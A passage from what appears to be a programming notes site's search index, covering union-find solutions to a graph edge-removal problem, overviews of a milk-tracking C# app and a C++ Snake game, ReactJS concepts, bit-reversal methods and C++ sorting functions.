t=edges[i][0];\n            int u=edges[i][1];\n            int v=edges[i][2];\n            if(t==1){\n                bool b=merge(u,v);\n                if(b==false) count++;\n            }\n            else if(t==3){\n                merge(u,v);\n            }\n        }\n        for(int i=1;i&lt;=n;i++){\n            if(find(1)!=find(i)) return -1;\n        }\n        return count;\n    }\n};\n</code></pre> <p>The given implementation of the <code>Solution</code> class is designed to be more memory efficient due to several key reasons:</p>"},{"location":"programming/Maximize%20shortcut%20nodes/#1-fixed-size-arrays","title":"1. Fixed-size Arrays","text":"<p>The <code>parent</code> and <code>size</code> arrays are declared with a fixed size of 100001: <pre><code>int parent[100001];\nint size[100001];\n</code></pre> This ensures that memory allocation happens only once and avoids the overhead associated with dynamic memory allocation using <code>std::vector</code>.</p>"},{"location":"programming/Maximize%20shortcut%20nodes/#2-efficient-union-find-operations","title":"2. Efficient Union-Find Operations","text":"<p>The union-find operations (<code>find</code>, <code>make</code>, and <code>merge</code>) are implemented with path compression and union by size, which are both memory-efficient operations: - Path Compression: This technique ensures that the tree height remains small, which speeds up future operations and reduces the overall memory footprint required for tree traversal. - Union by Size: By always attaching the smaller tree under the root of the larger tree, the height of the trees remains balanced, ensuring that the depth of any node is logarithmic with respect to the number of nodes, reducing the overall memory usage.</p>"},{"location":"programming/Maximize%20shortcut%20nodes/#3-avoidance-of-redundant-data-structures","title":"3. Avoidance of Redundant Data Structures","text":"<p>Unlike some implementations which might use multiple union-find data structures for Alice and Bob separately, this implementation uses a single union-find structure, reusing it efficiently to avoid redundant memory usage: - Single Union-Find Structure: The same <code>parent</code> and <code>size</code> arrays are reused for both types of edges (type 2 and type 3 for Bob first, then type 1 and type 3 for Alice), reducing the memory footprint by not requiring separate structures.</p>"},{"location":"programming/Maximize%20shortcut%20nodes/#4-iterative-reinitialization","title":"4. Iterative Reinitialization","text":"<p>The reinitialization of the union-find structure for the second pass (for Alice) is done in-place by reusing the same arrays: <pre><code>for(int i=1;i&lt;=n;i++){\n    make(i);\n}\n</code></pre> This approach avoids the need to create additional arrays or copies of the data, ensuring that the memory usage remains minimal.</p>"},{"location":"programming/Maximize%20shortcut%20nodes/#summary-of-memory-efficiency","title":"Summary of Memory Efficiency","text":"<ul> <li>Fixed-size arrays prevent the overhead of dynamic memory allocation.</li> <li>Path compression and union by size ensure efficient memory usage in union-find operations.</li> <li>Reusing the same union-find structure for both types of edges reduces redundant memory allocation.</li> <li>In-place reinitialization of the union-find structure further minimizes memory overhead.</li> </ul> <p>Overall, the combination of these techniques ensures that the solution is both time-efficient and memory-efficient, making it suitable for handling large inputs within the constraints typically found in competitive programming or interview scenarios.</p> <p>Mempry Efficient 2:</p> <pre><code>class Solution {\npublic:\n    class DSU{\n        public:\n        vector&lt;int&gt; parent;\n        vector&lt;int&gt; rank;\n        int components;\n\n        DSU(int n){\n            parent.resize(n+1);\n            for(int i=0; i&lt;=n; i++){\n                parent[i] = i;\n            }\n            rank.resize(n+1);\n            components = n;\n        }\n\n        int find (int x) {\n            if (x == parent[x]) \n            return x;\n\n            return parent[x] = find(parent[x]);\n        }\n\n        void Union (int x, int y) {\n            int x_parent = find(x);\n            int y_parent = find(y);\n\n            if (x_parent == y_parent) \n                return;\n\n            if(rank[x_parent] &gt; rank[y_parent]) {\n                parent[y_parent] = x_parent;\n            } else if(rank[x_parent] &lt; rank[y_parent]) {\n                parent[x_parent] = y_parent;\n            } else {\n                parent[x_parent] = y_parent;\n                rank[y_parent]++;\n            }\n            components--;\n        }\n        bool isSingleComponent(){\n            return components == 1;\n        }\n    };\n\n    int maxNumEdgesToRemove(int n, vector&lt;vector&lt;int&gt;&gt;&amp; edges) {\n        DSU Alice(n);\n        DSU Bob(n);\n\n        auto lambda = [&amp;](vector&lt;int&gt;&amp;vec1,vector&lt;int&gt;&amp;vec2){\n            return vec1[0] &gt; vec2[0];\n        }; \n        sort(begin(edges),end(edges),lambda);\n        int edgeCount = 0;\n        for(auto &amp;vec:edges){\n            int type = vec[0];\n            int u = vec[1];\n            int v = vec[2];\n\n            if(type == 3){\n                bool addEdge = false;\n                if(Alice.find(u) != Alice.find(v)){\n                    Alice.Union(u,v);\n                    addEdge = true;\n                }\n                if(Bob.find(u) != Bob.find(v)){\n                    Bob.Union(u,v);\n                    addEdge = true;\n                }\n                if(addEdge == true) edgeCount++;\n            }else if(type == 2){\n                if(Bob.find(u) != Bob.find(v)){\n                    Bob.Union(u,v);\n                    edgeCount++;\n                }\n            }else{\n                if(Alice.find(u) != Alice.find(v)){\n                    Alice.Union(u,v);\n                    edgeCount++;\n                }\n            }\n            if(Alice.isSingleComponent() &amp;&amp; Bob.isSingleComponent()){\n                return edges.size() - edgeCount;\n        }\n\n        }\n        return -1;\n    }\n};\n</code></pre> <p>The given implementation of the <code>Solution</code> class, utilizing the Disjoint Set Union (DSU) data structure, is both efficient and effective in solving the problem. Below is an analysis of why it is efficient and well-suited for the task:</p>"},{"location":"programming/Maximize%20shortcut%20nodes/#key-aspects-of-the-implementation","title":"Key Aspects of the Implementation","text":"<ol> <li> <p>DSU (Disjoint Set Union) Class:</p> <ul> <li> <p>Initialization:      <pre><code>DSU(int n){\n    parent.resize(n+1);\n    for(int i=0; i&lt;=n; i++){\n        parent[i] = i;\n    }\n    rank.resize(n+1);\n    components = n;\n}\n</code></pre>     The DSU class initializes the <code>parent</code> and <code>rank</code> vectors, and sets the number of components to <code>n</code>. This ensures that each node starts as its own parent, and all ranks are initially zero.</p> </li> <li> <p>Find with Path Compression:     <pre><code>int find (int x) {\n    if (x == parent[x]) \n        return x;\n    return parent[x] = find(parent[x]);\n}\n</code></pre>     The <code>find</code> function uses path compression to flatten the structure of the tree, ensuring that future queries are faster.</p> </li> <li> <p>Union by Rank:     <pre><code>void Union (int x, int y) {\n    int x_parent = find(x);\n    int y_parent = find(y);\n\n    if (x_parent == y_parent) \n        return;\n\n    if(rank[x_parent] &gt; rank[y_parent]) {\n        parent[y_parent] = x_parent;\n    } else if(rank[x_parent] &lt; rank[y_parent]) {\n        parent[x_parent] = y_parent;\n    } else {\n        parent[x_parent] = y_parent;\n        rank[y_parent]++;\n    }\n    components--;\n}\n</code></pre>     The <code>Union</code> function uses rank to ensure that the smaller tree is always added under the root of the larger tree, which keeps the tree balanced and the depth minimal.</p> </li> </ul> </li> <li> <p>Edge Processing in <code>maxNumEdgesToRemove</code>:</p> <ul> <li> <p>Sorting:     <pre><code>auto lambda = [&amp;](vector&lt;int&gt;&amp;vec1,vector&lt;int&gt;&amp;vec2){\n    return vec1[0] &gt; vec2[0];\n}; \nsort(begin(edges),end(edges),lambda);\n</code></pre>     Edges are sorted by type in descending order, ensuring type 3 edges (common edges) are processed first. This is crucial because type 3 edges are more versatile, as they can be used by both Alice and Bob.</p> </li> <li> <p>Processing Edges:     <pre><code>for(auto &amp;vec:edges){\n    int type = vec[0];\n    int u = vec[1];\n    int v = vec[2];\n\n    if(type == 3){\n        bool addEdge = false;\n        if(Alice.find(u) != Alice.find(v)){\n            Alice.Union(u,v);\n            addEdge = true;\n        }\n        if(Bob.find(u) != Bob.find(v)){\n            Bob.Union(u,v);\n            addEdge = true;\n        }\n        if(addEdge == true) edgeCount++;\n    }else if(type == 2){\n        if(Bob.find(u) != Bob.find(v)){\n            Bob.Union(u,v);\n            edgeCount++;\n        }\n    }else{\n        if(Alice.find(u) != Alice.find(v)){\n            Alice.Union(u,v);\n            edgeCount++;\n        }\n    }\n    if(Alice.isSingleComponent() &amp;&amp; Bob.isSingleComponent()){\n        return edges.size() - edgeCount;\n    }\n}\n</code></pre>     The code processes type 3 edges first, trying to merge the nodes in both Alice's and Bob's DSU structures. If a merge is successful (i.e., the nodes were not already in the same set), it increments the <code>edgeCount</code>. This ensures that the maximum number of common edges is utilized.</p> </li> <li> <p>Early Termination:     <pre><code>if(Alice.isSingleComponent() &amp;&amp; Bob.isSingleComponent()){\n    return edges.size() - edgeCount;\n}\n</code></pre>     The code checks if both Alice's and Bob's graphs are fully connected after each edge addition. If both are fully connected, it returns the number of removable edges, thereby avoiding unnecessary iterations.</p> </li> </ul> </li> </ol>"},{"location":"programming/Maximize%20shortcut%20nodes/#efficiency","title":"Efficiency","text":"<ul> <li> <p>Time Complexity: The find and union operations with path compression and union by rank are nearly constant time, i.e., O(\u03b1(n)), where \u03b1 is the inverse Ackermann function, which grows very slowly. Sorting the edges takes O(m log m), where m is the number of edges. Thus, the overall time complexity is O(m log m + \u03b1(n)).</p> </li> <li> <p>Space Complexity: The DSU class uses O(n) space for the parent and rank arrays, which is efficient in terms of space usage.</p> </li> </ul>"},{"location":"programming/Maximize%20shortcut%20nodes/#conclusion_2","title":"Conclusion","text":"<p>This implementation is efficient because it leverages the DSU data structure with path compression and union by rank to keep operations nearly constant time. Sorting the edges and processing type 3 edges first ensures that the algorithm maximizes the use of versatile edges, reducing redundant edges early. The early termination condition further enhances performance by stopping the process as soon as both graphs are fully connected.</p>"},{"location":"programming/Milk%20App%20c%23/","title":"Milk Storage C#","text":""},{"location":"programming/Milk%20App%20c%23/#detailed-explanation-of-my-milkapp","title":"Detailed Explanation of My MilkApp","text":""},{"location":"programming/Milk%20App%20c%23/#overview","title":"Overview","text":"<p>The My MilkApp repository on GitHub, created by cuhawk, is an open-source project designed for managing and tracking milk production and distribution. It combines a robust backend written in C# with a dynamic frontend using JavaScript, CSS, and HTML.</p>"},{"location":"programming/Milk%20App%20c%23/#key-functionalities","title":"Key Functionalities","text":"<ol> <li>Milk Production Tracking:</li> <li>Daily Records: Allows users to input and manage daily milk production data.</li> <li> <p>Trend Monitoring: Visualizes production trends over time to help identify patterns.</p> </li> <li> <p>Distribution Management:</p> </li> <li>Client Tracking: Keeps track of milk distributed to various clients.</li> <li> <p>Delivery Scheduling: Manages delivery schedules and routes to ensure timely distribution.</p> </li> <li> <p>Data Analytics:</p> </li> <li>Report Generation: Generates detailed reports on production and distribution metrics.</li> <li>Operational Analysis: Analyzes data to help optimize production and distribution processes.</li> </ol>"},{"location":"programming/Milk%20App%20c%23/#technical-stack","title":"Technical Stack","text":"<ul> <li>Backend:</li> <li>Developed using C# with .NET framework for handling server-side logic.</li> <li> <p>The business logic layer (BLL) and data access layer (DAL) are well-defined:</p> <ul> <li>MyMilkApp.BLL: Manages the core business functionalities.</li> <li>MyMilkApp.DAL: Handles database interactions, ensuring data integrity and efficient queries.</li> </ul> </li> <li> <p>Frontend:</p> </li> <li>Built with JavaScript, CSS, and HTML to create an interactive and user-friendly interface.</li> <li>Provides responsive design elements for various devices.</li> </ul>"},{"location":"programming/Milk%20App%20c%23/#project-structure","title":"Project Structure","text":"<ol> <li>MyMilkApp.BLL:</li> <li>Contains business logic classes and methods for managing milk production and distribution data.</li> <li>MyMilkApp.DAL:</li> <li>Manages database connectivity, queries, and data transactions.</li> <li>Frontend Components:</li> <li>Includes JavaScript for interactivity, CSS for styling, and HTML for structuring the web pages.</li> </ol>"},{"location":"programming/Milk%20App%20c%23/#getting-started","title":"Getting Started","text":"<ol> <li>Clone the Repository:    <pre><code>git clone https://github.com/cuhawk/my-milkapp.git\n</code></pre></li> <li>Configuration:</li> <li>Set up the environment configuration and database connection strings in the appropriate configuration files.</li> <li>Run the Application:</li> <li>Open the project in Visual Studio or use the .NET CLI to build and run the application.</li> <li>Ensure all dependencies are installed and the database is properly set up.</li> </ol>"},{"location":"programming/Milk%20App%20c%23/#contribution","title":"Contribution","text":"<ul> <li>The project is open for contributions. Developers can:</li> <li>Fork the Repository: Create a personal copy of the repository.</li> <li>Create a Branch: Make changes in a new branch.</li> <li>Submit Pull Requests: Propose changes to be merged into the main repository.</li> </ul>"},{"location":"programming/Milk%20App%20c%23/#conclusion","title":"Conclusion","text":"<p>The My MilkApp is a comprehensive solution for dairy farms and milk distributors, providing tools for tracking production and managing distribution. It leverages the strengths of the .NET framework for backend processes and a user-friendly frontend to ensure efficient operations. For more details and to explore the code, visit the My MilkApp GitHub repository.</p>"},{"location":"programming/React/","title":"ReactJS","text":"<p>ReactJS is a popular JavaScript library for building user interfaces, particularly single-page applications. It allows developers to create reusable UI components. Below is a comprehensive list of the components and concepts associated with ReactJS:</p>"},{"location":"programming/React/#core-concepts","title":"Core Concepts","text":"<ol> <li>JSX (JavaScript XML):</li> <li>Syntax extension that allows writing HTML elements in JavaScript.</li> <li> <p>Example: <code>&lt;h1&gt;Hello, world!&lt;/h1&gt;</code>.</p> </li> <li> <p>Components:</p> </li> <li>The building blocks of a React application.</li> <li>Two types: Functional Components and Class Components.</li> </ol>"},{"location":"programming/React/#functional-components","title":"Functional Components","text":"<ul> <li>Defined as JavaScript functions.</li> <li>Return JSX to render the UI.</li> <li>Example:   <pre><code>function Welcome(props) {\n  return &lt;h1&gt;Hello, {props.name}&lt;/h1&gt;;\n}\n</code></pre></li> </ul>"},{"location":"programming/React/#class-components","title":"Class Components","text":"<ul> <li>ES6 classes that extend <code>React.Component</code>.</li> <li>Must contain a <code>render()</code> method.</li> <li>Example:   <pre><code>class Welcome extends React.Component {\n  render() {\n    return &lt;h1&gt;Hello, {this.props.name}&lt;/h1&gt;;\n  }\n}\n</code></pre></li> </ul>"},{"location":"programming/React/#component-lifecycle-methods-for-class-components","title":"Component Lifecycle Methods (for Class Components)","text":"<ol> <li>Mounting:</li> <li><code>constructor()</code></li> <li><code>static getDerivedStateFromProps()</code></li> <li><code>render()</code></li> <li> <p><code>componentDidMount()</code></p> </li> <li> <p>Updating:</p> </li> <li><code>static getDerivedStateFromProps()</code></li> <li><code>shouldComponentUpdate()</code></li> <li><code>render()</code></li> <li><code>getSnapshotBeforeUpdate()</code></li> <li> <p><code>componentDidUpdate()</code></p> </li> <li> <p>Unmounting:</p> </li> <li><code>componentWillUnmount()</code></li> </ol>"},{"location":"programming/React/#state-and-props","title":"State and Props","text":"<ul> <li>State: Local state within a component. Managed using <code>useState</code> hook (in functional components) or state property in class components.   <pre><code>const [count, setCount] = useState(0);\n</code></pre></li> <li>Props: Read-only attributes passed from parent to child components.   <pre><code>&lt;Welcome name=\"Sara\" /&gt;\n</code></pre></li> </ul>"},{"location":"programming/React/#hooks-for-functional-components","title":"Hooks (for Functional Components)","text":"<ol> <li>useState: Manages state.</li> <li>useEffect: Handles side effects.</li> <li>useContext: Accesses context values.</li> <li>useReducer: Manages complex state logic.</li> <li>useCallback: Memoizes callback functions.</li> <li>useMemo: Memoizes expensive calculations.</li> <li>useRef: Accesses DOM elements directly.</li> <li>useLayoutEffect: Similar to <code>useEffect</code> but fires synchronously after all DOM mutations.</li> <li>useImperativeHandle: Customizes the instance value that is exposed when using <code>ref</code>.</li> <li>useDebugValue: Displays a label for custom hooks in React DevTools.</li> </ol>"},{"location":"programming/React/#context-api","title":"Context API","text":"<ul> <li>Provides a way to pass data through the component tree without passing props down manually at every level.   <pre><code>const MyContext = React.createContext(defaultValue);\n</code></pre></li> </ul>"},{"location":"programming/React/#higher-order-components-hoc","title":"Higher-Order Components (HOC)","text":"<ul> <li>A pattern that involves a function that takes a component and returns a new component.   <pre><code>function withLoading(Component) {\n  return function LoadingComponent(props) {\n    return &lt;Component {...props} /&gt;;\n  }\n}\n</code></pre></li> </ul>"},{"location":"programming/React/#render-props","title":"Render Props","text":"<ul> <li>A technique for sharing code between React components using a prop whose value is a function.   <pre><code>&lt;DataProvider render={(data) =&gt; &lt;SomeComponent data={data} /&gt;} /&gt;\n</code></pre></li> </ul>"},{"location":"programming/React/#fragments","title":"Fragments","text":"<ul> <li>Allows grouping multiple elements without adding extra nodes to the DOM.   <pre><code>&lt;React.Fragment&gt;\n  &lt;ChildA /&gt;\n  &lt;ChildB /&gt;\n&lt;/React.Fragment&gt;\n</code></pre></li> </ul>"},{"location":"programming/React/#portals","title":"Portals","text":"<ul> <li>Provides a way to render children into a DOM node that exists outside the DOM hierarchy of the parent component.   <pre><code>ReactDOM.createPortal(child, container);\n</code></pre></li> </ul>"},{"location":"programming/React/#error-boundaries","title":"Error Boundaries","text":"<ul> <li>Catch JavaScript errors anywhere in their child component tree, log those errors, and display a fallback UI.   <pre><code>class ErrorBoundary extends React.Component {\n  componentDidCatch(error, info) {\n    // Handle error\n  }\n  render() {\n    return this.props.children;\n  }\n}\n</code></pre></li> </ul>"},{"location":"programming/React/#refs","title":"Refs","text":"<ul> <li>Provides a way to access the DOM nodes or React elements created in the render method.   <pre><code>const myRef = React.createRef();\n</code></pre></li> </ul>"},{"location":"programming/React/#proptypes","title":"PropTypes","text":"<ul> <li>Runtime type checking for props in React components.   <pre><code>MyComponent.propTypes = {\n  name: PropTypes.string.isRequired,\n};\n</code></pre></li> </ul>"},{"location":"programming/React/#custom-hooks","title":"Custom Hooks","text":"<ul> <li>Functions that start with \"use\" and can call other hooks.   <pre><code>function useCustomHook() {\n  const [state, setState] = useState(initialState);\n  return [state, setState];\n}\n</code></pre></li> </ul>"},{"location":"programming/React/#concurrent-mode-experimental","title":"Concurrent Mode (Experimental)","text":"<ul> <li>Allows React to work on multiple tasks simultaneously.</li> </ul>"},{"location":"programming/React/#suspense-and-lazy","title":"Suspense and Lazy","text":"<ul> <li><code>Suspense</code>: Enables waiting for some code to load and declaratively specify a loading state.</li> <li><code>React.lazy()</code>: Dynamically imports a component.   <pre><code>const OtherComponent = React.lazy(() =&gt; import('./OtherComponent'));\n</code></pre></li> </ul> <p>Understanding these components and concepts is crucial for effectively building and maintaining React applications.</p>"},{"location":"programming/Reverse/","title":"Reversing Bits","text":"<p>Reversing the bits of a given 32-bit unsigned integer can be achieved in multiple ways. Here are some interesting methods to solve this problem in C++:</p>"},{"location":"programming/Reverse/#method-1-bit-manipulation-with-loop","title":"Method 1: Bit Manipulation with Loop","text":"<p>This method involves iterating through each bit of the integer and reversing their positions.</p> <pre><code>#include &lt;iostream&gt;\n#include &lt;cstdint&gt;\n\nuint32_t reverseBits(uint32_t n) {\n    uint32_t result = 0;\n    for (int i = 0; i &lt; 32; ++i) {\n        result &lt;&lt;= 1;         // Shift result to the left\n        result |= (n &amp; 1);    // Get the last bit of n and add it to result\n        n &gt;&gt;= 1;              // Shift n to the right\n    }\n    return result;\n}\n\nint main() {\n    uint32_t n = 0b00000010100101000001111010011100;\n    uint32_t reversed = reverseBits(n);\n    std::cout &lt;&lt; reversed &lt;&lt; std::endl;\n    return 0;\n}\n</code></pre>"},{"location":"programming/Reverse/#method-2-lookup-table","title":"Method 2: Lookup Table","text":"<p>This method involves using a lookup table to reverse bits in chunks (e.g., 8 bits at a time).</p> <pre><code>#include &lt;iostream&gt;\n#include &lt;cstdint&gt;\n\nuint8_t reverseByte(uint8_t byte) {\n    byte = (byte &gt;&gt; 4) | (byte &lt;&lt; 4);\n    byte = ((byte &amp; 0xCC) &gt;&gt; 2) | ((byte &amp; 0x33) &lt;&lt; 2);\n    byte = ((byte &amp; 0xAA) &gt;&gt; 1) | ((byte &amp; 0x55) &lt;&lt; 1);\n    return byte;\n}\n\nuint32_t reverseBits(uint32_t n) {\n    static const uint8_t lookup[256] = {\n        0x00, 0x80, 0x40, 0xC0, 0x20, 0xA0, 0x60, 0xE0, 0x10, 0x90, 0x50, 0xD0, 0x30, 0xB0, 0x70, 0xF0,\n        0x08, 0x88, 0x48, 0xC8, 0x28, 0xA8, 0x68, 0xE8, 0x18, 0x98, 0x58, 0xD8, 0x38, 0xB8, 0x78, 0xF8,\n        0x04, 0x84, 0x44, 0xC4, 0x24, 0xA4, 0x64, 0xE4, 0x14, 0x94, 0x54, 0xD4, 0x34, 0xB4, 0x74, 0xF4,\n        0x0C, 0x8C, 0x4C, 0xCC, 0x2C, 0xAC, 0x6C, 0xEC, 0x1C, 0x9C, 0x5C, 0xDC, 0x3C, 0xBC, 0x7C, 0xFC,\n        0x02, 0x82, 0x42, 0xC2, 0x22, 0xA2, 0x62, 0xE2, 0x12, 0x92, 0x52, 0xD2, 0x32, 0xB2, 0x72, 0xF2,\n        0x0A, 0x8A, 0x4A, 0xCA, 0x2A, 0xAA, 0x6A, 0xEA, 0x1A, 0x9A, 0x5A, 0xDA, 0x3A, 0xBA, 0x7A, 0xFA,\n        0x06, 0x86, 0x46, 0xC6, 0x26, 0xA6, 0x66, 0xE6, 0x16, 0x96, 0x56, 0xD6, 0x36, 0xB6, 0x76, 0xF6,\n        0x0E, 0x8E, 0x4E, 0xCE, 0x2E, 0xAE, 0x6E, 0xEE, 0x1E, 0x9E, 0x5E, 0xDE, 0x3E, 0xBE, 0x7E, 0xFE,\n        0x01, 0x81, 0x41, 0xC1, 0x21, 0xA1, 0x61, 0xE1, 0x11, 0x91, 0x51, 0xD1, 0x31, 0xB1, 0x71, 0xF1,\n        0x09, 0x89, 0x49, 0xC9, 0x29, 0xA9, 0x69, 0xE9, 0x19, 0x99, 0x59, 0xD9, 0x39, 0xB9, 0x79, 0xF9,\n        0x05, 0x85, 0x45, 0xC5, 0x25, 0xA5, 0x65, 0xE5, 0x15, 0x95, 0x55, 0xD5, 0x35, 0xB5, 0x75, 0xF5,\n        0x0D, 0x8D, 0x4D, 0xCD, 0x2D, 0xAD, 0x6D, 0xED, 0x1D, 0x9D, 0x5D, 0xDD, 0x3D, 0xBD, 0x7D, 0xFD,\n        0x03, 0x83, 0x43, 0xC3, 0x23, 0xA3, 0x63, 0xE3, 0x13, 0x93, 0x53, 0xD3, 0x33, 0xB3, 0x73, 0xF3,\n        0x0B, 0x8B, 0x4B, 0xCB, 0x2B, 0xAB, 0x6B, 0xEB, 0x1B, 0x9B, 0x5B, 0xDB, 0x3B, 0xBB, 0x7B, 0xFB,\n        0x07, 0x87, 0x47, 0xC7, 0x27, 0xA7, 0x67, 0xE7, 0x17, 0x97, 0x57, 0xD7, 0x37, 0xB7, 0x77, 0xF7,\n        0x0F, 0x8F, 0x4F, 0xCF, 0x2F, 0xAF, 0x6F, 0xEF, 0x1F, 0x9F, 0x5F, 0xDF, 0x3F, 0xBF, 0x7F, 0xFF,\n    };\n\n    return (lookup[n &amp; 0xFF] &lt;&lt; 24) |\n           (lookup[(n &gt;&gt; 8) &amp; 0xFF] &lt;&lt; 16) |\n           (lookup[(n &gt;&gt; 16) &amp; 0xFF] &lt;&lt; 8) |\n           lookup[(n &gt;&gt; 24) &amp; 0xFF];\n}\n\nint main() {\n    uint32_t n = 0b00000010100101000001111010011100;\n    uint32_t reversed = reverseBits(n);\n    std::cout &lt;&lt; reversed &lt;&lt; std::endl;\n    return 0;\n}\n</code></pre>"},{"location":"programming/Reverse/#method-3-bit-manipulation-with-masking-and-shifting","title":"Method 3: Bit Manipulation with Masking and Shifting","text":"<p>This method divides and conquers by reversing bits in chunks and then combining them.</p> <pre><code>#include &lt;iostream&gt;\n#include &lt;cstdint&gt;\n\nuint32_t reverseBits(uint32_t n) {\n    n = (n &gt;&gt; 16) | (n &lt;&lt; 16);\n    n = ((n &amp; 0xFF00FF00) &gt;&gt; 8) | ((n &amp; 0x00FF00FF) &lt;&lt; 8);\n    n = ((n &amp; 0xF0F0F0F0) &gt;&gt; 4) |\n\n ((n &amp; 0x0F0F0F0F) &lt;&lt; 4);\n    n = ((n &amp; 0xCCCCCCCC) &gt;&gt; 2) | ((n &amp; 0x33333333) &lt;&lt; 2);\n    n = ((n &amp; 0xAAAAAAAA) &gt;&gt; 1) | ((n &amp; 0x55555555) &lt;&lt; 1);\n    return n;\n}\n\nint main() {\n    uint32_t n = 0b00000010100101000001111010011100;\n    uint32_t reversed = reverseBits(n);\n    std::cout &lt;&lt; reversed &lt;&lt; std::endl;\n    return 0;\n}\n</code></pre> <p>These methods offer different approaches to the problem, from simple loops to more advanced techniques like lookup tables and bit manipulation. Each method provides a unique perspective on how to reverse the bits in a 32-bit unsigned integer efficiently.</p>"},{"location":"programming/Snake/","title":"Snake C++","text":"<p>The \"Snake\" project by cuhawk is a basic implementation of the classic Snake game using C++ and the Simple and Fast Multimedia Library (SFML). Here's a detailed overview of the project:</p>"},{"location":"programming/Snake/#project-structure","title":"Project Structure","text":"<ol> <li>Source Code:</li> <li>Code.cpp: The main file containing the game's logic, including snake movement, collision detection, and game over conditions.</li> <li> <p>Headers and Classes: Handles various aspects like game mechanics and rendering.</p> </li> <li> <p>Assets:</p> </li> <li>Fonts and Icons: Resources for enhancing the visual appeal of the game.</li> <li>Libraries: Includes SFML and OpenAL for multimedia functionalities.</li> </ol>"},{"location":"programming/Snake/#key-features","title":"Key Features","text":"<ol> <li>Game Logic:</li> <li>Implements the classic Snake mechanics where the snake grows longer as it eats food.</li> <li> <p>Uses a simple coordinate system to handle snake movement and food placement.</p> </li> <li> <p>Graphics and Audio:</p> </li> <li>Utilizes SFML for rendering graphics and handling window events.</li> <li> <p>Incorporates basic audio using OpenAL.</p> </li> <li> <p>Execution:</p> </li> <li>Snake.exe: The compiled executable for running the game on Windows.</li> </ol>"},{"location":"programming/Snake/#how-to-run","title":"How to Run","text":"<ol> <li> <p>Clone the Repository: <pre><code>git clone https://github.com/cuhawk/Snake\ncd Snake\n</code></pre></p> </li> <li> <p>Compile the Code:</p> </li> <li>Ensure you have a C++ compiler and SFML installed.</li> <li> <p>Compile <code>Code.cpp</code> with the necessary SFML libraries.</p> </li> <li> <p>Run the Game:</p> </li> <li>Execute <code>Snake.exe</code> if using the precompiled executable.</li> <li>If compiling manually, run the output file generated by your compiler.</li> </ol>"},{"location":"programming/Snake/#usage-and-customization","title":"Usage and Customization","text":"<ul> <li>The project serves as a foundation for learning and can be extended or modified to include more features such as:</li> <li>Enhanced graphics and animations.</li> <li>Additional game modes or levels.</li> <li>High-score tracking and more complex AI for the snake's movement.</li> </ul>"},{"location":"programming/Snake/#learning-outcomes","title":"Learning Outcomes","text":"<ul> <li>C++ Programming: Demonstrates practical application of C++ for game development.</li> <li>SFML Usage: Provides insights into using SFML for creating 2D games, handling graphics, sound, and user input.</li> <li>Game Development Basics: Offers a starting point for understanding game loops, event handling, and basic AI for games.</li> </ul>"},{"location":"programming/Snake/#contribution","title":"Contribution","text":"<ul> <li>Contributions are welcome for bug fixes, feature additions, and improvements. Fork the repository, make your changes, and submit a pull request.</li> </ul> <p>For more details, you can visit the project repository on GitHub: cuhawk/Snake.</p>"},{"location":"programming/Sorting%20Idealogy/","title":"Sorting Idealogy","text":""},{"location":"programming/Sorting%20Idealogy/#sorting-algorithms-in-c-when-to-use-which","title":"Sorting Algorithms in C++: When to Use Which","text":"<p>Sorting algorithms are essential tools in computer science for organizing data. In C++, the Standard Template Library (STL) provides several sorting algorithms, each suited to different scenarios. This blog will discuss the most commonly used sorting algorithms and when to use them.</p>"},{"location":"programming/Sorting%20Idealogy/#1-stdsort-introsort","title":"1. std::sort (IntroSort)","text":"<p>Description: <code>std::sort</code> is a highly optimized sorting algorithm in the C++ STL. It is an implementation of Introsort, which is a hybrid sorting algorithm combining QuickSort, HeapSort, and InsertionSort.</p> <p>When to Use: - General Purpose: Best for most sorting tasks due to its efficiency. - Large Datasets: Efficient with a time complexity of (O(n \\log n)). - Stable Performance: Provides good average performance with a worst-case time complexity of (O(n \\log n)).</p> <p>Example: <pre><code>#include &lt;algorithm&gt;\n#include &lt;vector&gt;\n\nint main() {\n    std::vector&lt;int&gt; vec = {4, 2, 5, 1, 3};\n    std::sort(vec.begin(), vec.end());\n    return 0;\n}\n</code></pre></p>"},{"location":"programming/Sorting%20Idealogy/#2-stdstable_sort","title":"2. std::stable_sort","text":"<p>Description: <code>std::stable_sort</code> is a stable sorting algorithm, meaning it maintains the relative order of equal elements. It typically uses MergeSort, which has a worst-case time complexity of (O(n \\log n)).</p> <p>When to Use: - Stability Required: When the relative order of equal elements must be preserved. - Complex Objects: Useful for sorting objects where secondary criteria need to be maintained.</p> <p>Example: <pre><code>#include &lt;algorithm&gt;\n#include &lt;vector&gt;\n\nstruct Person {\n    std::string name;\n    int age;\n};\n\nbool compareByAge(const Person&amp; a, const Person&amp; b) {\n    return a.age &lt; b.age;\n}\n\nint main() {\n    std::vector&lt;Person&gt; people = {{\"Alice\", 30}, {\"Bob\", 25}, {\"Charlie\", 30}};\n    std::stable_sort(people.begin(), people.end(), compareByAge);\n    return 0;\n}\n</code></pre></p>"},{"location":"programming/Sorting%20Idealogy/#3-stdpartial_sort","title":"3. std::partial_sort","text":"<p>Description: <code>std::partial_sort</code> sorts the first <code>n</code> elements in a range while the rest remain unsorted.</p> <p>When to Use: - Top Elements: When you need to find the top <code>n</code> elements. - Efficiency: More efficient than fully sorting if only a subset of the sorted data is needed.</p> <p>Example: <pre><code>#include &lt;algorithm&gt;\n#include &lt;vector&gt;\n#include &lt;iostream&gt;\n\nint main() {\n    std::vector&lt;int&gt; vec = {4, 2, 5, 1, 3};\n    std::partial_sort(vec.begin(), vec.begin() + 3, vec.end());\n    return 0;\n}\n</code></pre></p>"},{"location":"programming/Sorting%20Idealogy/#4-stdnth_element","title":"4. std::nth_element","text":"<p>Description: <code>std::nth_element</code> rearranges the elements in such a way that the element at the nth position is the element that would be in that position if the entire range were sorted. All elements before this element are less than or equal to the nth element, and all elements after are greater than or equal.</p> <p>When to Use: - Order Statistic: To find the nth smallest or largest element. - Partitioning: When you need to partition data based on a pivot element.</p> <p>Example: <pre><code>#include &lt;algorithm&gt;\n#include &lt;vector&gt;\n#include &lt;iostream&gt;\n\nint main() {\n    std::vector&lt;int&gt; vec = {4, 2, 5, 1, 3};\n    std::nth_element(vec.begin(), vec.begin() + 2, vec.end());\n    return 0;\n}\n</code></pre></p>"},{"location":"programming/Sorting%20Idealogy/#5-custom-sorting-with-stdsort","title":"5. Custom Sorting with std::sort","text":"<p>Description: You can customize <code>std::sort</code> using a comparison function or a lambda function to define the sorting criteria.</p> <p>When to Use: - Custom Criteria: When you need to sort based on custom logic. - Complex Structures: Sorting objects with multiple attributes.</p> <p>Example: <pre><code>#include &lt;algorithm&gt;\n#include 